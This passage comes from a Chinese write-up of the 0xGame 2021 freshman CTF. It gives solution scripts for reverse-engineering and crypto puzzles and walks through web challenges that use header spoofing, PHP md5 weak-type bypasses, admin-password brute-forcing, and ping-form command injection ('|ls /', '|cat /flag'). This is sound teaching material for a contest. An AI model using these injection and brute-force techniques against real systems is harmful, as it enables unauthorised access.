786428</span><br><span class="line">10 : 3145732</span><br><span class="line">11 : 12582908</span><br><span class="line">12 : 50331652</span><br><span class="line">13 : 201326588</span><br><span class="line">14 : 805306372</span><br><span class="line">15 : 3221225468</span><br><span class="line">16 : 4</span><br><span class="line">17 : 4294967292</span><br><span class="line">18 : 4</span><br><span class="line">19 : 4294967292</span><br><span class="line">20 : 4</span><br><span class="line">21 : 4294967292</span><br><span class="line">22 : 4</span><br><span class="line">23 : 4294967292</span><br><span class="line">24 : 4</span><br><span class="line">25 : 4294967292</span><br><span class="line">26 : 4</span><br><span class="line">27 : 4294967292</span><br><span class="line">28 : 4</span><br><span class="line">29 : 4294967292</span><br><span class="line">30 : 4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>很容易就发现循环节了把，所以接下来就是直接异或操作就行，代码比较简单，这里就不写了</p>
+<p>甚至我们可以求出这个数列的通项公式，也很容易得到这个数列的每一个数据对应的值，下面给出一个知乎链接讲述形如斐波那契数列的数列如何求通项公式</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/25217301" title="斐波那契通项公式">斐波那契数列通项公式是怎样推导出来的？- 知乎</a></p>
+<p>通项公式为  <code>a(n) = 3 * 4 ** n + 4 * (-1) ** n</code></p>
+<h3 id="roundabout"><a class="markdownIt-Anchor" href="#roundabout">#</a> Roundabout</h3>
+<p>脱壳后，简单的利用 key 来循环异或，代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">68</span>, <span class="number">16</span>, <span class="number">46</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">61</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">70</span>, <span class="number">90</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">64</span>, <span class="number">62</span>, <span class="number">75</span>, <span class="number">95</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">104</span>, <span class="number">91</span>, <span class="number">18</span>]</span><br><span class="line">h = <span class="string">&quot;this_is_not_flag\x00&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">42</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(h[i % <span class="number">16</span>]) ^ arr[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 0xGame&#123;b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="zero-three"><a class="markdownIt-Anchor" href="#zero-three">#</a> Zero Three</h3>
+<p>z3 使用一下，就能解出 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = [Int(<span class="string">&#x27;x%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>)]</span><br><span class="line">num = [Int(<span class="string">&#x27;u%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    s.add(p[i] &gt; <span class="number">0x20</span>)</span><br><span class="line">    s.add(p[i] &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">2</span> * p[<span class="number">5</span>] + <span class="number">8225</span> - p[<span class="number">0</span>] - <span class="number">9</span> * p[<span class="number">3</span>] - p[<span class="number">4</span>] - p[<span class="number">9</span>] + p[<span class="number">10</span>] - <span class="number">6</span> * p[<span class="number">11</span>] - p[<span class="number">13</span>] - <span class="number">3</span> * p[<span class="number">14</span>] - <span class="number">5</span> * p[<span class="number">15</span>] == <span class="number">5643</span>)</span><br><span class="line">s.add(<span class="number">3</span> * p[<span class="number">14</span>] + <span class="number">8</span> * p[<span class="number">10</span>] -<span class="number">3</span>  * p[<span class="number">2</span>] - <span class="number">6</span> * p[<span class="number">0</span>] + <span class="number">8225</span> - p[<span class="number">1</span>] - <span class="number">2</span> * p[<span class="number">5</span>] + <span class="number">3</span> * p[<span class="number">8</span>] - <span class="number">8</span> * p[<span class="number">11</span>] + <span class="number">4</span> * p[<span class="number">12</span>] - <span class="number">6</span> * p[<span class="number">15</span>] == <span class="number">6620</span>)</span><br><span class="line">s.add(-<span class="number">5</span> * p[<span class="number">12</span>] - <span class="number">7</span> * p[<span class="number">6</span>] - <span class="number">3</span> * p[<span class="number">1</span>] + <span class="number">8225</span> - <span class="number">2</span> * p[<span class="number">0</span>] - p[<span class="number">2</span>] - <span class="number">5</span> * p[<span class="number">3</span>] - <span class="number">7</span> * p[<span class="number">4</span>] - <span class="number">6</span> * p[<span class="number">5</span>] - <span class="number">2</span> * p[<span class="number">8</span>] + <span class="number">6</span> * p[<span class="number">13</span>] == <span class="number">5538</span>)</span><br><span class="line">s.add(<span class="number">2</span> * p[<span class="number">5</span>] + <span class="number">2</span> * p[<span class="number">1</span>] + <span class="number">8225</span> - <span class="number">2</span> * p[<span class="number">0</span>] - <span class="number">2</span> * p[<span class="number">3</span>] + <span class="number">3</span> * p[<span class="number">4</span>] - <span class="number">2</span> * p[<span class="number">8</span>] - p[<span class="number">10</span>] - p[<span class="number">12</span>] - <span class="number">2</span> * p[<span class="number">14</span>] - <span class="number">2</span> * p[<span class="number">15</span>] == <span class="number">7693</span>)</span><br><span class="line">s.add(-<span class="number">6</span> * p[<span class="number">14</span>] + <span class="number">8225</span> - <span class="number">2</span> * p[<span class="number">1</span>] - <span class="number">2</span> * p[<span class="number">2</span>] - <span class="number">9</span> * p[<span class="number">3</span>] + <span class="number">2</span> * p[<span class="number">4</span>] - <span class="number">5</span> * p[<span class="number">7</span>] + <span class="number">2</span> * p[<span class="number">8</span>] - <span class="number">9</span> * p[<span class="number">9</span>] - <span class="number">4</span> * p[<span class="number">10</span>] - <span class="number">6</span> * p[<span class="number">15</span>] == <span class="number">4735</span>)</span><br><span class="line">s.add(<span class="number">9</span> * p[<span class="number">14</span>] - <span class="number">7</span> * p[<span class="number">10</span>] + <span class="number">8</span> * p[<span class="number">9</span>] + <span class="number">5</span> * p[<span class="number">0</span>] + <span class="number">8225</span> - p[<span class="number">2</span>] + p[<span class="number">5</span>] - <span class="number">5</span> * p[<span class="number">6</span>] - <span class="number">8</span> * p[<span class="number">11</span>] - p[<span class="number">12</span>] - <span class="number">9</span> * p[<span class="number">15</span>] == <span class="number">7060</span>)</span><br><span class="line">s.add(p[<span class="number">13</span>] - <span class="number">5</span> * p[<span class="number">7</span>] - <span class="number">3</span> * p[<span class="number">2</span>] - <span class="number">3</span> * p[<span class="number">0</span>] + <span class="number">8225</span> - <span class="number">4</span> * p[<span class="number">1</span>] - <span class="number">4</span> * p[<span class="number">4</span>] - p[<span class="number">6</span>] + <span class="number">9</span> * p[<span class="number">10</span>] - <span class="number">2</span> * p[<span class="number">14</span>] - <span class="number">6</span> * p[<span class="number">15</span>] == <span class="number">5864</span>)</span><br><span class="line">s.add(-<span class="number">9</span> * p[<span class="number">14</span>] - <span class="number">3</span> * p[<span class="number">10</span>] + <span class="number">9</span> * p[<span class="number">1</span>] - <span class="number">6</span> * p[<span class="number">0</span>] + <span class="number">8225</span> - <span class="number">5</span> * p[<span class="number">3</span>] - <span class="number">4</span> * p[<span class="number">7</span>] - <span class="number">2</span> * p[<span class="number">11</span>] - <span class="number">2</span> * p[<span class="number">12</span>] + p[<span class="number">13</span>] + <span class="number">9</span> * p[<span class="number">15</span>] == <span class="number">7393</span>)</span><br><span class="line">s.add(<span class="number">6</span> * p[<span class="number">9</span>] - <span class="number">5</span> * p[<span class="number">8</span>] - <span class="number">3</span> * p[<span class="number">6</span>] + <span class="number">9</span> * p[<span class="number">2</span>] + <span class="number">8225</span> - p[<span class="number">4</span>] + <span class="number">3</span> * p[<span class="number">5</span>] - <span class="number">7</span> * p[<span class="number">7</span>] + <span class="number">7</span> * p[<span class="number">10</span>] - <span class="number">2</span> * p[<span class="number">13</span>] - p[<span class="number">14</span>] == <span class="number">8442</span>)</span><br><span class="line">s.add(<span class="number">8</span> * p[<span class="number">6</span>] - <span class="number">7</span> * p[<span class="number">2</span>] + <span class="number">8225</span> - <span class="number">8</span> * p[<span class="number">1</span>] - p[<span class="number">3</span>] + <span class="number">6</span> * p[<span class="number">4</span>] - p[<span class="number">7</span>] + <span class="number">5</span> * p[<span class="number">8</span>] - <span class="number">4</span> * p[<span class="number">10</span>] - p[<span class="number">14</span>] + <span class="number">7</span> * p[<span class="number">15</span>] == <span class="number">8376</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">4</span>):</span><br><span class="line">    s.add(num[i//<span class="number">4</span>] == (p[i] + (p[i+<span class="number">1</span>] * <span class="number">256</span>) + (p[i+<span class="number">2</span>] * <span class="number">65536</span>) + (p[i+<span class="number">3</span>] * <span class="number">16777216</span>)))</span><br><span class="line"></span><br><span class="line">s.add(-<span class="number">22827</span> * num[<span class="number">4</span>] + <span class="number">21984</span> * num[<span class="number">1</span>] - <span class="number">38534</span> * num[<span class="number">5</span>] - <span class="number">32344</span> * num[<span class="number">0</span>] == -<span class="number">98460819657603</span>)</span><br><span class="line">s.add(-<span class="number">38215</span> * num[<span class="number">2</span>] - <span class="number">37324</span> * num[<span class="number">4</span>] - <span class="number">8436</span> * num[<span class="number">5</span>] + <span class="number">15405</span> * num[<span class="number">0</span>] == -<span class="number">131665436206262</span>)</span><br><span class="line">s.add(<span class="number">10926</span> * num[<span class="number">7</span>] - <span class="number">28942</span> * num[<span class="number">1</span>] - <span class="number">34572</span> * num[<span class="number">3</span>] - <span class="number">10538</span> * num[<span class="number">5</span>] == -<span class="number">121891239772992</span>)</span><br><span class="line">s.add(-<span class="number">30117</span> * num[<span class="number">6</span>] - <span class="number">22990</span> * num[<span class="number">2</span>] - <span class="number">20471</span> * num[<span class="number">5</span>] + <span class="number">34494</span> * num[<span class="number">7</span>] == -<span class="number">57089882568260</span>)</span><br><span class="line">s.add(-<span class="number">33112</span> * num[<span class="number">5</span>] - <span class="number">19335</span> * num[<span class="number">4</span>] + <span class="number">34348</span> * num[<span class="number">1</span>] + <span class="number">31445</span> * num[<span class="number">2</span>] == <span class="number">56335531538050</span>)</span><br><span class="line">s.add(-<span class="number">13566</span> * num[<span class="number">5</span>] + <span class="number">14758</span> * num[<span class="number">0</span>] - <span class="number">19814</span> * num[<span class="number">2</span>] - <span class="number">26447</span> * num[<span class="number">4</span>] == -<span class="number">81105980248303</span>)</span><br><span class="line">s.add(<span class="number">25898</span> * num[<span class="number">5</span>] - <span class="number">15817</span> * num[<span class="number">1</span>] + <span class="number">20463</span> * num[<span class="number">7</span>] - <span class="number">33578</span> * num[<span class="number">0</span>] == -<span class="number">28860618440412</span>)</span><br><span class="line">s.add(-<span class="number">35429</span> * num[<span class="number">7</span>] + <span class="number">36594</span> * num[<span class="number">2</span>] - <span class="number">28801</span> * num[<span class="number">6</span>] - <span class="number">14952</span> * num[<span class="number">3</span>] == -<span class="number">45384029412201</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="built_in">print</span>(num[i], result[num[i]])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">        flag += libnum.n2s(result[num[i]].as_long())[::-<span class="number">1</span>]</span><br><span class="line">    flag = <span class="string">&quot;0xGame&#123;&quot;</span> + <span class="built_in">str</span>(flag, encoding = <span class="string">&quot;utf-8&quot;</span>) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 0xGame&#123;udydYCBxUB6vqsAt5VCs6LKDRqXLUhSW&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h2>
+<h3 id="看看我的头"><a class="markdownIt-Anchor" href="#看看我的头">#</a> 看看我的头</h3>
+<p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p>
+<p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把 GET 请求方式改为 POST，可以看到网页提示变化。再是提示要使用 <code>N1k0la浏览器</code> 。请求头中 User-Agent 向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加 <code>N1k0la</code> 。页面又发生变化，提示要本地登陆，所以我们添加 X-Forwarded-For 头去伪造我们的来源 ip 为本地 ip：127.0.0.1</p>
+<p>然后会得到一串 base64 编码的数据解码后是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame2021&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;X1cT34m&#x27;</span>];<span class="variable">$d</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;Pupi1&#x27;</span>];<span class="variable">$c</span>=<span class="string">&#x27;welcome to the</span></span><br><span class="line"><span class="string">0xGame2021&#x27;</span>;<span class="keyword">if</span>(md5(<span class="variable">$b</span>)==md5(<span class="variable">$d</span>)&amp;&amp;<span class="variable">$a</span>===<span class="variable">$c</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里是一个 php 的弱类型，md5 碰撞，有多种方式去做</p>
+<ol>
+<li>md5 () 返回 32 位字符串，若均为<strong> 0e</strong> 开头可被认为是科学计数法表示的数字<strong> 0</strong></li>
+<li>md5 () 处理不了数组，会报错并返回 NULL 值。所以 2 个变量的 md5 值会相同</li>
+<li>因为这里没有对是否传入变量进行判断，所以不传入 md5 处理的那 2 个变量，md5 () 会直接输出 <code>d41d8cd98f00b204e9800998ecf8427e</code>  代表空。</li>
+<li>当然也可以直接传入 2 个一样的值 😃</li>
+</ol>
+<h3 id="看看你能登陆吗"><a class="markdownIt-Anchor" href="#看看你能登陆吗">#</a> 看看你能登陆吗</h3>
+<p>这个题主要是为了让新生熟悉 burpsuit 的操作，了解 web 渗透的本质是信息搜集。</p>
+<p>题目说了登陆的关键词，自然想到可能存在后台，直接试常见的后台路径，或者使用目录扫描器扫描后台路径。发现 <code>/admin</code>  存在访问发现后台。有提示说密码是 4 位纯数字，常识可知后台的用户名大部分为 admin，所以我们爆破密码。这里可以使用 burpsuit，或者 python 写脚本，只是这里密码故意设为 0310（出题人的生日，嘻嘻  所以在爆破密码时要注意 0 开头的 4 个数字也是合理的。爆破登陆即可。</p>
+<h3 id="robots"><a class="markdownIt-Anchor" href="#robots">#</a> robots</h3>
+<p>Robots 协议了解一下。</p>
+<p>robots.txt 会被放在网站根目录下，告诉爬虫哪些不能爬，哪些能爬。 直接访问</p>
+<p><code>/robots.txt</code>  得到提示 4ll.html，之后直接访问 <code>/4ll.html</code> F12 查看网页源代码，即可得到。</p>
+<h3 id="爱ping才会赢"><a class="markdownIt-Anchor" href="#爱ping才会赢">#</a> 爱 ping 才会赢</h3>
+<p>这个题主要考察 linux 下的命令执行。</p>
+<p>首先发现带有 Ping 字样的按钮是不可点击的，F12 后将对应处的 disabled=&quot;disabled&quot; 删除即可点中。</p>
+<p>这里实现 ping 的功能猜测是使用了调用系统命令的函数，所以我们可以进行命令拼接。</p>
+<p>在 linux 中；| 等<strong>连接符</strong>可连接两个独立语句并执行</p>
+<p><code>|ls /</code>  所以我们传入这个就可以查看根目录下的文件，找到 flag 后直接传入 <code>|cat /flag</code>  即可</p>
+<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h2>
+<h3 id="crypto-sign-in"><a class="markdownIt-Anchor" href="#crypto-sign-in">#</a> Crypto Sign in</h3>
+<p>下载附件，阅读一下入门指南，最后就有 flag。</p>
+<h3 id="cutecaesar"><a class="markdownIt-Anchor" href="#cutecaesar">#</a> CuteCaesar</h3>
+<p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了 hint，大家也都很快找到了这个解码器。解码之后是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0aJdph&#123;fdhvdu_1v_q0w_fxwh&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里根据题目名字，就可以知道是凯撒加密，百度找一个凯撒密码的解密器，位移量是 3，解密即可。</p>
+<h3 id="manycode"><a class="markdownIt-Anchor" href="#manycode">#</a> manycode</h3>
+<p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索 ctf 常见编码，一个个比照就可以一层层解密。主要希望大家能掌握 Base64、32、16 这三种常见编码的形式。</p>
+<p>首先是 aaencode，找一个在线解码器即可，网上说的在控制台运行会报错，可能是 js 的新语法规定 “_” 不能定义变量。然后就是三层 base 解码，依次是 base16，base32，base64。最后就可以得到 flag。</p>
+<h3 id="ezvigenère"><a class="markdownIt-Anchor" href="#ezvigenère">#</a> ezVigenère</h3>
+<p>这题的做法很多，有的同学是写程序爆破 key，有的同学是根据最后 flag 的格式 0xGame，从而推断 key 为 abc，当然也有同学找了一个网址，里面的 key 默认是 abc，直接解密（大意了，忘改 key 了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<h3 id="myfunction"><a class="markdownIt-Anchor" href="#myfunction">#</a> MyFunction</h3>
+<p>一个函数，这个函数是已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=x\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span></span></span></span>, 求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> 的结果。<br>
+这个题是模仿西电新生赛的函数题出的，那边用的是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">y=e^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span>，这个函数有反函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span></span></span></span>。但<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=x\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span></span></span></span> 没有反函数，但根据这个函数在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[1,+∞)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span></span></span></span> 单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差 (但实测并不需要)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line">D=<span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(D)):</span><br><span class="line">    y=<span class="built_in">float</span>(D[i])</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(x*log(x)-y)&lt;<span class="number">0.003</span>:</span><br><span class="line">            s+=<span class="built_in">chr</span>(x)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#0xGame&#123;YouH4veKn0wedPy7honL081s&lt;y=ln(x)&gt;InM47hs&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>不过多数人是 Excel 打表、或者一个一个算的。直接开脚本写的不多。</p>
+<h3 id="class-8"><a class="markdownIt-Anchor" href="#class-8">#</a> Class 8</h3>
+<p>八种古典密码（可能确实出得有点脑洞了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第1、6位是盲文</span><br><span class="line">第2、7位是跳舞的小人</span><br><span class="line">第3位是猪圈密码</span><br><span class="line">第4、11、16位是手机九键键盘</span><br><span class="line">第5、9、14位是莫尔斯电码</span><br><span class="line">第8、12位是银河字母</span><br><span class="line">第10、15位是培根密码</span><br><span class="line">第13位是电脑键盘，cfgb之间围着的是V</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这道题一开始打算出规则的单词的，但后面就出得不规则了。主要是第 13 位、第 15 位出问题出得比较多。第 15 位确实有两种解法，因此第 15 位是 <code>O</code>  最后也算对了。</p>
+<p>flag: <code>0xGame&#123;CLASSLNRDDLDVTNB&#125;</code>  或 <code>0xGame&#123;CLASSLNRDDLDVTOB&#125;</code></p>
+<h3 id="abc-of-rsa"><a class="markdownIt-Anchor" href="#abc-of-rsa">#</a> ABC Of RSA</h3>
+<p>这个题是后面加的。主要是给新生入门一下 RSA。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在RSA加密中，已知：</span><br><span class="line">p=<span class="number">9677</span></span><br><span class="line">q=<span class="number">9241</span></span><br><span class="line">e=<span class="number">10009</span></span><br><span class="line">求解密指数d不超过<span class="number">4000</span>万的正值，用十进制表示，包上0xGame&#123;&#125;提交。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>百度百科上就有很多关于 RSA 的加密方法和解密方法。如果用上 Crypto 包，是非常好做的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p,q=<span class="number">9677</span>,<span class="number">9241</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(inverse(<span class="number">10009</span>,phi))</span><br><span class="line"><span class="comment">#39982249</span></span><br><span class="line"><span class="comment">#flag是0xGame&#123;39982249&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
